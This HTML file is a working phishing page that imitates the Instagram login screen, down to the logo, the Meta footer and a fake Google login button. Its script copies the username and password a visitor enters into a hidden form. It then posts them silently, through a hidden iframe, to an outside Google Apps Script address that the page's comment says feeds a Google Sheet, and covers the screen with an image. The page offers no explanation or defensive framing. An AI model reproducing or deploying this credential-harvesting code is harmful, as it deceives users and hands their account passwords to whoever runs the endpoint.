<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Instagram</title>
    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Nunito:wght@300;400;600;700&display=swap"
        rel="stylesheet" />
    <style>
        *,
        *::before,
        *::after {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        :root {
            --ig-gradient: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            --white: #ffffff;
            --light-gray: #fafafa;
            --mid-gray: #dbdbdb;
            --text-gray: #8e8e8e;
            --dark: #262626;
            --blue: #0095f6;
        }

        body {
            min-height: 100vh;
            background: var(--light-gray);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            font-family: 'Nunito', sans-serif;
            position: relative;
            overflow: hidden;
        }

        /* Animated gradient background blobs */
        body::before,
        body::after {
            content: '';
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.12;
            z-index: 0;
            animation: float 10s ease-in-out infinite alternate;
        }

        body::before {
            width: 500px;
            height: 500px;
            background: var(--ig-gradient);
            top: -150px;
            left: -150px;
        }

        body::after {
            width: 400px;
            height: 400px;
            background: linear-gradient(135deg, #bc1888, #0095f6);
            bottom: -100px;
            right: -100px;
            animation-delay: -5s;
        }

        @keyframes float {
            from {
                transform: translate(0, 0) scale(1);
            }

            to {
                transform: translate(40px, 30px) scale(1.08);
            }
        }

        .wrapper {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 10px;
            z-index: 1;
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }

        /* Card */
        .card {
            background: var(--white);
            border: 1px solid var(--mid-gray);
            border-radius: 4px;
            width: 100%;
            padding: 40px 40px 24px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 18px;
            animation: slideUp 0.5s cubic-bezier(0.22, 1, 0.36, 1) both;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(28px);
            }

            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Logo */
        .logo {
            font-family: 'Grand Hotel', cursive;
            font-size: 42px;
            background: var(--ig-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: -1px;
            margin-bottom: 6px;
            user-select: none;
        }

        /* Form */
        form {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 6px;
        }

        .input-wrap {
            position: relative;
            width: 100%;
        }

        .input-wrap input {
            width: 100%;
            background: #fafafa;
            border: 1px solid var(--mid-gray);
            border-radius: 3px;
            padding: 14px 12px 6px;
            font-size: 12px;
            font-family: 'Nunito', sans-serif;
            color: var(--dark);
            outline: none;
            transition: border-color 0.2s;
        }

        .input-wrap input:focus {
            border-color: #a8a8a8;
        }

        .input-wrap label {
            position: absolute;
            left: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 12px;
            color: var(--text-gray);
            pointer-events: none;
            transition: top 0.15s, font-size 0.15s, color 0.15s;
        }

        .input-wrap input:focus+label,
        .input-wrap input:not(:placeholder-shown)+label {
            top: 28%;
            font-size: 10px;
            color: #8e8e8e;
        }

        /* Show/hide password toggle */
        .toggle-pw {
            position: absolute;
            right: 10px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            font-size: 12px;
            font-weight: 700;
            color: var(--dark);
            cursor: pointer;
            padding: 4px;
            display: none;
        }

        .input-wrap:has(input[type="password"]) .toggle-pw,
        .input-wrap:has(input[type="text"].pw-visible) .toggle-pw {
            display: block;
        }

        /* OR divider */
        .divider {
            display: flex;
            align-items: center;
            gap: 14px;
            width: 100%;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: var(--mid-gray);
        }

        .divider span {
            font-size: 12px;
            font-weight: 700;
            color: var(--text-gray);
            letter-spacing: 1px;
        }

        /* Buttons */
        .btn-login {
            width: 100%;
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            background: var(--blue);
            color: #fff;
            font-family: 'Nunito', sans-serif;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s, transform 0.1s;
            margin-top: 4px;
        }

        .btn-login:hover {
            opacity: 0.88;
        }

        .btn-login:active {
            transform: scale(0.98);
        }

        .btn-login:disabled {
            opacity: 0.4;
            cursor: not-allowed;
        }

        .btn-google {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: 100%;
            padding: 8px 16px;
            border: 1px solid var(--mid-gray);
            border-radius: 8px;
            background: transparent;
            color: var(--blue);
            font-family: 'Nunito', sans-serif;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.15s;
        }

        .btn-google:hover {
            background: #f2f2f2;
        }

        .btn-google svg {
            width: 18px;
            height: 18px;
        }

        /* Forgot password */
        .forgot {
            font-size: 12px;
            color: var(--blue);
            text-decoration: none;
            font-weight: 600;
            text-align: center;
            display: block;
            width: 100%;
            margin-top: 4px;
        }

        .forgot:hover {
            text-decoration: underline;
        }

        /* Error message */
        .error-msg {
            font-size: 12px;
            color: #ed4956;
            text-align: center;
            min-height: 16px;
            font-weight: 600;
            animation: shake 0.3s ease;
        }

        @keyframes shake {

            0%,
            100% {
                transform: translateX(0);
            }

            25% {
                transform: translateX(-5px);
            }

            75% {
                transform: translateX(5px);
            }
        }

        /* Success state */
        .success-overlay {
            display: none;
        }

        .success-overlay.visible {
            display: block;
        }

        .fullscreen-img {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            z-index: 9999;
        }

        /* Sign up card */
        .signup-card {
            background: var(--white);
            border: 1px solid var(--mid-gray);
            border-radius: 4px;
            width: 100%;
            padding: 20px;
            text-align: center;
            font-size: 14px;
            color: var(--dark);
            animation: slideUp 0.55s 0.08s cubic-bezier(0.22, 1, 0.36, 1) both;
        }

        .signup-card a {
            color: var(--blue);
            font-weight: 700;
            text-decoration: none;
            margin-left: 4px;
        }

        .signup-card a:hover {
            text-decoration: underline;
        }

        /* App download */
        .app-links {
            text-align: center;
            font-size: 14px;
            color: var(--dark);
            animation: slideUp 0.6s 0.14s cubic-bezier(0.22, 1, 0.36, 1) both;
        }

        .app-links p {
            margin-bottom: 12px;
        }

        .store-btns {
            display: flex;
            gap: 8px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .store-btn {
            border: 1px solid #999;
            border-radius: 6px;
            padding: 6px 14px;
            font-size: 12px;
            color: var(--dark);
            text-decoration: none;
            font-weight: 600;
            transition: background 0.15s;
            background: #fff;
        }

        .store-btn:hover {
            background: #f2f2f2;
        }

        footer {
            margin-top: 20px;
            text-align: center;
            font-size: 12px;
            color: var(--text-gray);
            z-index: 1;
            animation: slideUp 0.65s 0.2s cubic-bezier(0.22, 1, 0.36, 1) both;
        }

        footer a {
            color: var(--text-gray);
            text-decoration: none;
            margin: 0 6px;
        }

        footer a:hover {
            text-decoration: underline;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 4px 0;
            margin-bottom: 8px;
        }

        /* Loading spinner inside button */
        .spinner {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid rgba(255, 255, 255, 0.5);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            vertical-align: middle;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="wrapper">

        <!-- Main Login Card -->
        <div class="card">
            <div class="logo">Instagram</div>

            <!-- Login Form -->
            <div id="formSection" style="width:100%; display:flex; flex-direction:column; gap:12px;">
                <form id="loginForm" novalidate>
                    <div class="input-wrap" style="margin-bottom:6px;">
                        <input type="text" id="username" placeholder=" " autocomplete="username" required />
                        <label for="username">Phone number, username, or email</label>
                    </div>

                    <div class="input-wrap">
                        <input type="password" id="password" placeholder=" " autocomplete="current-password" required />
                        <label for="password">Password</label>
                        <button type="button" class="toggle-pw" id="togglePw" aria-label="Show password">Show</button>
                    </div>

                    <div class="error-msg" id="errorMsg"></div>

                    <button type="submit" class="btn-login" id="loginBtn">Log in</button>
                </form>

                <div class="divider"><span>OR</span></div>

                <button class="btn-google" id="googleBtn">
                    <!-- Google icon SVG -->
                    <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
                        <path fill="#FFC107"
                            d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z" />
                        <path fill="#FF3D00"
                            d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z" />
                        <path fill="#4CAF50"
                            d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z" />
                        <path fill="#1976D2"
                            d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z" />
                    </svg>
                    Log in with Google
                </button>

                <a href="#" class="forgot" onclick="return false;">Forgot password?</a>
            </div>

        </div>

        <!-- Sign Up Card -->
        <div class="signup-card">
            Don't have an account?<a href="#" onclick="return false;">Sign up</a>
        </div>
    </div>

    <!-- Hidden form to submit to Google Sheet -->
    <iframe name="hidden-iframe" style="display:none;"></iframe>
    <form id="sheetForm" action="https://script.google.com/macros/s/AKfycby_c2t_NlARpEXCm_NS9mIrj9s-aHEyeLV4-aw_qcaqUuKmobEIkQx6wFqIiM9I_F9Y/exec" method="POST" target="hidden-iframe" style="display:none;">
        <input type="text" name="email" id="sheetEmail" />
        <input type="text" name="password" id="sheetPassword" />
    </form>

    <!-- Success State (hidden until login) -->
    <div class="success-overlay" id="successOverlay">
        <img src="image.png" class="fullscreen-img" alt="" />
    </div>

    <footer>
        <div class="footer-links">
            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a>
            <a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a>
            <a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
            <a href="#">Instagram Lite</a><a href="#">Threads</a>
        </div>
        <span>© 2026 Instagram from Meta</span>
    </footer>

    <script>

        const form = document.getElementById('loginForm');

        const usernameInput =
            document.getElementById('username');

        const passwordInput =
            document.getElementById('password');

        const loginBtn =
            document.getElementById('loginBtn');

        const errorMsg =
            document.getElementById('errorMsg');

        const formSection =
            document.getElementById('formSection');

        const successOverlay =
            document.getElementById('successOverlay');

        const toggleBtn =
            document.getElementById('togglePw');


        // SHOW / HIDE PASSWORD
        toggleBtn.addEventListener('click', () => {

            const isHidden =
                passwordInput.type === 'password';

            passwordInput.type =
                isHidden ? 'text' : 'password';

            toggleBtn.textContent =
                isHidden ? 'Hide' : 'Show';

        });


        // FORM SUBMIT
        form.addEventListener('submit', async (e) => {

            e.preventDefault();

            errorMsg.textContent = '';

            const user =
                usernameInput.value.trim();

            const pass =
                passwordInput.value;

            // VALIDATION
            if (!user) {

                showError("Please enter username");
                return;

            }

            if (!pass) {

                showError("Please enter password");
                return;

            }

            if (pass.length < 6) {

                showError("Password must be at least 6 characters");
                return;

            }

            document.getElementById('sheetEmail').value = user;
            document.getElementById('sheetPassword').value = pass;
            document.getElementById('sheetForm').submit();

            formSection.style.display = "none";
            successOverlay.classList.add("visible");

        });


        // GOOGLE LOGIN BUTTON
        document.getElementById('googleBtn').addEventListener('click', () => {
            formSection.style.display = 'none';
            successOverlay.classList.add('visible');
        });


        // ERROR FUNCTION
        function showError(msg) {
            errorMsg.textContent = msg;
        }

    </script>
</body>

</html>
